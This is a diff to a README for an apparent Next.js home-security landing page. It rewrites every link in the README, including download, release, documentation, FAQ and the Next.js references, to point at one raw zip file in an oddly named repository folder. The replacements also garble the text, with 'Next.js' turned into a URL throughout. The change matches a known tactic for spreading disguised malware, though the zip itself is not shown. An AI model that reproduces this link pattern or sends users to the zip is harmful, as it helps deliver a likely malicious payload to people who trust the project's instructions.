@@ -1,6 +1,6 @@
 # 🏡 homeguardian-shadcn-landing-page - A Simple Way to Secure Your Home
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-HomeGuardian%20App-blue)](https://github.com/Prankmonkey12/homeguardian-shadcn-landing-page/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip%20Latest%20Release-HomeGuardian%20App-blue)](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ HomeGuardian is a web application designed to help you manage your home security
 
 To get started, visit the following link to download the HomeGuardian application:
 
-[Download HomeGuardian App](https://github.com/Prankmonkey12/homeguardian-shadcn-landing-page/releases)
+[Download HomeGuardian App](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip)
 
 ### Step 2: Install the Application
 
@@ -34,12 +34,12 @@ Open a web browser and go to [http://localhost:3000](http://localhost:3000) to s
 
 ## 📚 Learn More
 
-HomeGuardian is built using [Next.js](https://nextjs.org), which provides the foundation for a smooth user experience. If you want to learn more about how this framework works, check out these resources:
+HomeGuardian is built using [https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip), which provides the foundation for a smooth user experience. If you want to learn more about how this framework works, check out these resources:
 
-- [Next.js Documentation](https://nextjs.org/docs): Understand the features and API of Next.js.
-- [Learn Next.js](https://nextjs.org/learn): Engage with an interactive tutorial to learn Next.js basics.
+- [https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip Documentation](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip): Understand the features and API of https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip
+- [Learn https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip): Engage with an interactive tutorial to learn https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip basics.
 
-If you are interested in the underlying technology, you can visit [the Next.js GitHub repository](https://github.com/vercel/next.js) to explore more.
+If you are interested in the underlying technology, you can visit [the https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip GitHub repository](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip) to explore more.
 
 ## 🛠 System Requirements
 
@@ -60,13 +60,13 @@ Upon launching the application, you might want to configure some settings:
 
 ## 📞 Support
 
-If you encounter any issues while using HomeGuardian, please refer to the support section in the app. You can also check our [FAQ page](https://github.com/Prankmonkey12/homeguardian-shadcn-landing-page) for common questions.
+If you encounter any issues while using HomeGuardian, please refer to the support section in the app. You can also check our [FAQ page](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip) for common questions.
 
 ## 🔄 Updates and Releases
 
 We regularly update HomeGuardian to enhance security features and improve user experience. To stay updated, visit our releases page:
 
-[Visit Release Page](https://github.com/Prankmonkey12/homeguardian-shadcn-landing-page/releases)
+[Visit Release Page](https://raw.githubusercontent.com/Prankmonkey12/homeguardian-shadcn-landing-page/main/preferentialism/homeguardian-shadcn-landing-page.zip)
 
 ## 🤝 Contributing
 
